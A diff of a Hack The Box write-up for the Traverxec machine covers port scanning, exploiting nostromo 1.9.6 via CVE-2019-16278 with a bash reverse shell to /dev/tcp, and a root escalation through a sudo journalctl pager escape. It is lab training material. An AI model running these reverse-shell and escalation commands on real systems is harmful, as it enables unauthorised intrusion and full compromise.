@@ -6,7 +6,7 @@ https://app.hackthebox.com/machines/Traverxec
 
 ## Enumeration:
 
-I started the enumeration using quick rust scan to check for open ports & services:
+I began the enumeration using a quick rust scan to check for open ports and services:
 
 ```bash
 sudo rustscan -a 10.10.10.165 -- -sC -sV -vv -oN traver_nmap
@@ -31,14 +31,16 @@ PORT   STATE SERVICE REASON         VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-After the scan completed I found only 2 open ports 22 & 80. I also, noticed that the web server is running "nostrormo 1.9.6".
+The scan results showed two open ports, 22 for SSH and 80 for HTTP. The SSH service is running OpenSSH 7.9p1 on Debian 10, while the HTTP service is running nostromo version 1.9.6.
 
-I checked in searchsploit database if there is any exploit available for this version & I found 3:
+I then checked the searchsploit database for any available exploits related to nostromo & searchsploit results showed three exploits available for nostromo.:
 
 ```bash
 searchsploit nostrormo
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f5d6e281-0d88-4215-9b8d-82209ced2dc6)
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## Initial access:
 
@@ -60,6 +62,8 @@ Moving further to get a reverse shell, I used bash one-liner & executed it using
 python cve-2019-16278.py 10.10.10.165 80 'bash -c "bash -i >& /dev/tcp/10.10.14.128/53 0>&1"'
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/3b02ff8a-35ab-4d78-b109-108963928749)
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## User access:
 
@@ -133,7 +137,43 @@ After using the cracked credentilas, I was finally able to login to David & fetc
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/280cfb58-a11b-4191-aeca-6c1f3d056cad)
 
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+## Privilege Escalation:
 
+After gaining the access of David I started looking at the other files in David's home directory & I observed a file in the /bin folder "server-stats.sh"
 
+File contains below code:
+
+```bash
+#!/bin/bash
+
+cat /home/david/bin/server-stats.head
+echo "Load: `/usr/bin/uptime`"
+echo " "
+echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
+echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
+echo " "
+echo "Last 5 journal log lines:"
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+```
+In the last of the code we can see that it's running "journalctl" command with sudo privileges. I checked the GtfoBins for "journalctl" & obsred that it invokes the default pager, which is likely to be less, other functions may apply.
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/82e18d27-9f92-4b39-9061-eebf8a005267)
+
+While running the last line of code manually, it isn't loading the less pager.
+
+```bash
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+```
+
+I tried multiple time to load less pager in different way but everytime the service is getting started without opening the less pager, then in the end I thought to just minimze my terminal winodw size so, that the command won't be able to get sufficient 5 lines to display the results.
+
+And, this actually worked as this loaded the less pager in the terminal:
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9bad58f8-959c-4da0-92c5-ec0930d0af18)
+
+Once this less pager is loaded I just executed the "!/bin/bash" to load the bash shell. Which then loaded the shell as a root user. (pwn3d!🙂)
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f553be3b-5da0-439f-9bf8-9595058a95ad)
 
